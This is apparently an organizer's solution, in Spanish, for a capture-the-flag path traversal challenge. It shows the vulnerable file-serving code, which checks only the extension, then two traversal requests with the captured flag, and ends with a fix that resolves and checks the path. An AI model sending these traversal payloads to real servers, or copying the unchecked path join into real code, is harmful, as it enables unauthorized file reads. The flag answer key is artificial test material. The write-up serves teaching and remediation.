# Solución para organizadores

## Vulnerabilidad

El endpoint principal toma el parámetro `view`, comprueba únicamente que termine
en `.txt` y lo une directamente con `archive/public`:

```python
target = Path(app.config["ARCHIVE_ROOT"]) / requested_file
content = target.read_text(encoding="utf-8")
```

No se normaliza la ruta ni se verifica que el destino permanezca dentro de
`archive/public`. El archivo de la flag está dos niveles por encima:

```text
path-traversal/
├── flag.txt
└── archive/
    └── public/
        └── welcome.txt
```

## Explotación esperada

Solicitar:

```text
/?view=../../flag.txt
```

También puede enviarse codificando los separadores:

```text
/?view=..%2F..%2Fflag.txt
```

El backend resuelve esa ruta fuera del archivo público y devuelve:

```text
FLAG{lfi_directory_traversal_flag_0346}
```

## Remediación didáctica

Se debe resolver la ruta y comprobar que sea descendiente del directorio
permitido antes de abrirla:

```python
root = Path(app.config["ARCHIVE_ROOT"]).resolve()
target = (root / requested_file).resolve()
if not target.is_relative_to(root):
    abort(403)
```

La extensión por sí sola no constituye una protección contra path traversal.
